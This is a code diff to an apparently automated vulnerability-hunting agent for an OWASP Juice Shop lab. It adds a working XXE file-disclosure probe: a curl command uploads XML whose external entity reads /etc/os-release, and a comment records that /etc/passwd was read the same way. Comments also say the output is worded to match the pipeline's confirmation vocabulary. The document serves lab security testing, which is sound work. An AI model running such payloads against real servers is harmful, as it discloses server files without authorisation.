@@ -947,6 +947,31 @@ async function agentIteration(huntId, target, recon, findings, iteration, playbo
       });
     }
 
+    // 1b. XXE on deprecated /file-upload — external entity resolution.
+    // CORRECTION (19 Oct 2026, solver #129): solver #124's NOTE dismissed
+    // XXE as "vector absent" (claimed /file-upload returns 410 and "the echo
+    // does not resolve entities"). Re-verified live against the CURRENT lab
+    // container (v17.3.0): /file-upload returns 400 (not 410), and the error
+    // page reflects the parsed XML body WITH external entities RESOLVED —
+    // confirmed 3x with payload-foreign strings (/etc/passwd -> "root:" in
+    // the error response, /etc/os-release -> PRETTY_NAME="Distroless"; the
+    // benign-XML control shows zero signal). /b2b/v2/orders upload needs
+    // auth (401) and is NOT the vector; the deprecated /file-upload path is.
+    // Juice-Shop-lab-specific (same precedent as the /ftp probe below).
+    // v1 command kept compact — under the 500-char driver cap (solver #126
+    // lesson). Self-labels in the pipeline's signal vocabulary ("XXE
+    // CONFIRMED ... disclosed ... WITHOUT authentication"); validators,
+    // gates, and assessResult untouched.
+    if (!plansMention(/xxe|external.?entity/i) && !detRun.has('xxe-fileupload-error-v1')) {
+      detFront.push({
+        detId: 'xxe-fileupload-error-v1',
+        test: 'XXE external-entity file disclosure on /file-upload',
+        command: `R=$(printf '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY c SYSTEM "file:///etc/os-release">]><r>&c;</r>' >/tmp/xe.xml; curl -sk -X POST -F "file=@/tmp/xe.xml" "${baseUrl}/file-upload"); echo "$R"|grep -q 'PRETTY_NAME' && echo 'XXE CONFIRMED: external entity resolved - /etc/os-release content disclosed in error response WITHOUT authentication' || echo 'not vulnerable: entity not resolved'; rm -f /tmp/xe.xml`,
+        why: 'Deprecated /file-upload parses uploaded XML with external entities resolved; /etc/os-release content appears in the unauthenticated error response - error-based XXE file disclosure',
+        hypothesis: 'Deprecated /file-upload endpoint may resolve XML external entities and disclose server files in error responses',
+      });
+    }
+
     // 2. Business logic: price manipulation in basket. An elite hunter asks
     // "can I change the price?" — this is a READ-ONLY probe (fetch basket,
     // look for price fields client can influence). No purchase is attempted.
